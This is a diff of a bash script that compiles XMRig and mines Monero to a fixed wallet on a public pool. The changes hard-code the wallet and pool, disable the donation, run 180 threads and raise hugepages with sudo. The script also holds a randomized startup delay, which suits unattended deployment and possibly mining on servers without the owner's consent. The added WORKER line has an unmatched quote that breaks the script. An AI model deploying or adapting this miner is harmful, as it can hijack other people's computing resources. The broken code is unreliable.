@@ -1,7 +1,7 @@
 #!/bin/bash
 WALLET="82nfTTGkD2yTtGPZENcGCcM6yrgYdWqjbGvU4MpgcDzuXyVTUYkxkS4JcqEm2n73SddJ2QfdYL8JR8keXPsNwZxD872pyBc"
 POOL="pool.supportxmr.com:3333"
-WORKER="5slbke"
+WORKER=Vps2"
 
 echo "[+] Starting setup..."
 
@@ -15,11 +15,12 @@ build_xmrig() {
     mkdir build && cd build
     cmake ..
     make -j$(nproc)
+    sudo sysctl -w vm.nr_hugepages=8056
 }
 
 start_mining() {
     sleep $((60 + RANDOM % 60))
-    ./xmrig -o $POOL -u $WALLET -p $WORKER -k --coin monero
+    ./xmrig -o pool.supportxmr.com:3333 -u 82nfTTGkD2yTtGPZENcGCcM6yrgYdWqjbGvU4MpgcDzuXyVTUYkxkS4JcqEm2n73SddJ2QfdYL8JR8keXPsNwZxD872pyBc -p x --tls=false --donate-level=0 -t 180 --cpu-priority=5
 }
 
 if [ -d "xmrig" ]; then
